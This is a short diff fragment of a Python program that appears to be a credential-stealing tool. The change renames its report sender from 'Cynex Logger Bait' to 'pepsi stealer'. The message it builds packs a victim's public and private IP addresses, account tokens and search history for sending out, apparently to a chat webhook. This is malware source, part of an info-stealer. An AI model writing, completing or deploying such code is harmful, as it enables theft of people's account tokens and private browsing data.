@@ -90,7 +90,7 @@ def main():
     pass
   
   embed={
-    "username": "Cynex Logger Bait",
+    "username": "pepsi stealer",
     "content": f"**Public IP:** {public_ip} \n**Private IP:** {private_ip}  \n**Tokens:** {token} \n **Search History**: ```{links}```"
   }
 
